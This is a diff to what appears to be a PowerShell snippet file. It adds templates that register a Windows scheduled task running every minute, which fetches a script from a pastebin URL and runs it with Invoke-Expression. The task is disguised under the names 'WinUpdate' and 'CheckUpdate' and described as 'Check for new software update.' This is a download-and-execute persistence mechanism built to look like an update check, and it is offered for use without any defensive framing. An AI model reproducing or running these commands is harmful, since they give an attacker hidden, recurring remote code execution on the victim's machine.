@@ -1,3 +1,19 @@
-$a = New-ScheduledTaskAction -Execute 'powershell $rawcmd = Invoke-webrequest -URI https://lnkd.in/dEuW27dX -UseBasicParsing; Invoke-Expression $rawcmd;'
+
+/* generic command */ 
+
+$a = New-ScheduledTaskAction -Execute 'powershell $rawcmd = Invoke-webrequest -URI **PASTEBIN URL** -UseBasicParsing; Invoke-Expression $rawcmd;'
 $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
-Register-ScheduledTask -Action $a -Trigger $t -TaskPath "WinUpdate" -TaskName "CheckUpdate" -Description "*****"
+Register-ScheduledTask -Action $a -Trigger $t -TaskPath "WinUpdate" -TaskName "CheckUpdate" -Description "**DESCR.**"
+
+/* dir example */
+
+$a = New-ScheduledTaskAction -Execute 'powershell $rawcmd = Invoke-webrequest -URI https://pastebin.com/raw/4Pg262jQ -UseBasicParsing; Invoke-Expression $rawcmd;'
+$t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $a -Trigger $t -TaskPath "WinUpdate" -TaskName "CheckUpdate" -Description "Check for new software update."
+
+/* pastebin example with -Argument */
+
+$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://pastebin.com/raw/4Pg262jQ -UseBasicParsing; Invoke-Expression $rawcmd;'
+$t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
+Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check for new software update."
+
